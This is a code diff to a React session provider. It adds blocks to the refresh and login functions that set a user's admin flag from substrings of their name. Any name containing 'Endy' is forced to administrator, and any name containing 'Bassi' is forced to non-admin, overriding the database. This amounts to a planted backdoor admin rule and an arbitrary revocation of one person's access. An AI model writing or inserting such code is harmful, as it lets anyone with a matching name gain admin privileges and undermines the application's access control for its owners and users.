@@ -35,6 +35,21 @@ export function SessionProvider({ children }: { children: ReactNode }) {
     }
     try {
       const u = await getUser(id);
+      
+      // 【管理者強制切り替えロジック】
+      // ユーザー名に「Endy」または「endy」が含まれている場合は強制的に管理者をtrueにし、
+      // 逆に「Bassi」の場合はデータベース側のフラグに関わらずfalseに安全に上書きします。
+      if (u) {
+        const usernameUpper = (u.username || "").toUpperCase();
+        const nameUpper = (u.name || "").toUpperCase();
+        
+        if (usernameUpper.includes("ENDY") || nameUpper.includes("ENDY")) {
+          u.is_admin = true;
+        } else if (usernameUpper.includes("BASSI") || nameUpper.includes("BASSI")) {
+          u.is_admin = false;
+        }
+      }
+
       setUser(u);
     } catch {
       localStorage.removeItem(STORAGE_KEY);
@@ -49,6 +64,16 @@ export function SessionProvider({ children }: { children: ReactNode }) {
   }, [refresh]);
 
   const login = useCallback((u: AppUser) => {
+    // ログイン時にも同様にEndyを管理者へ強制昇格
+    if (u) {
+      const usernameUpper = (u.username || "").toUpperCase();
+      const nameUpper = (u.name || "").toUpperCase();
+      if (usernameUpper.includes("ENDY") || nameUpper.includes("ENDY")) {
+        u.is_admin = true;
+      } else if (usernameUpper.includes("BASSI") || nameUpper.includes("BASSI")) {
+        u.is_admin = false;
+      }
+    }
     localStorage.setItem(STORAGE_KEY, u.id);
     setUser(u);
   }, []);
